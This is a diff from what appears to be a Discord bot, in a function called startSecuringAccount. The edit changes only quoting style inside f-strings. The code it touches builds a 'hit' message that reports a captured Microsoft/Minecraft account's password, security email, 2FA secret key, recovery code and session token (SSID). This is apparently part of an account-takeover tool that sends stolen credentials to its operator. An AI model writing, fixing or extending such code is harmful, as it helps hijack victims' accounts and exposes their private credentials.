@@ -92,20 +92,20 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
         color = 0x279CF5
     )
     hit_embed.add_field(name="Claim ID", value=f"`{claim_id}`", inline=False)
-    hit_embed.add_field(name="MC Username", value=f"```{account["minecraft"]['name']}```", inline=False)
-    hit_embed.add_field(name="MC Method", value=f"```{account["minecraft"]['method']}```", inline=True)
-    hit_embed.add_field(name="MC Capes", value=f"```{account["minecraft"]['capes']}```", inline=True)
-    hit_embed.add_field(name="Primary Email", value=f"```{account["microsoft"]['email']}```", inline=False)
-    hit_embed.add_field(name="Security Email", value=f"```{account["microsoft"]['security_email']}```", inline=True)
-    hit_embed.add_field(name="Password", value=f"```{account["microsoft"]['password']}```", inline=False)
-    hit_embed.add_field(name="Secret Key", value=f"```{account["microsoft"]["auth_secret"]}```", inline=False)
-    hit_embed.add_field(name="Recovery Code", value=f"```{account["microsoft"]['recovery_code']}```", inline=False)
+    hit_embed.add_field(name="MC Username", value=f"```{account['minecraft']['name']}```", inline=False)
+    hit_embed.add_field(name="MC Method", value=f"```{account['minecraft']['method']}```", inline=True)
+    hit_embed.add_field(name="MC Capes", value=f"```{account['minecraft']['capes']}```", inline=True)
+    hit_embed.add_field(name="Primary Email", value=f"```{account['microsoft']['email']}```", inline=False)
+    hit_embed.add_field(name="Security Email", value=f"```{account['microsoft']['security_email']}```", inline=True)
+    hit_embed.add_field(name="Password", value=f"```{account['microsoft']['password']}```", inline=False)
+    hit_embed.add_field(name="Secret Key", value=f"```{account['microsoft']['auth_secret']}```", inline=False)
+    hit_embed.add_field(name="Recovery Code", value=f"```{account['microsoft']['recovery_code']}```", inline=False)
     hit_embed.set_footer(text = f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")
 
     # Minecraft SSID Embed
     ssid_embed = Embed(
         title = "SSID",
-        description = f"```{account["minecraft"]['SSID']}```"
+        description = f"```{account['minecraft']['SSID']}```"
     )
     
     if account["minecraft"]["SSID"]:
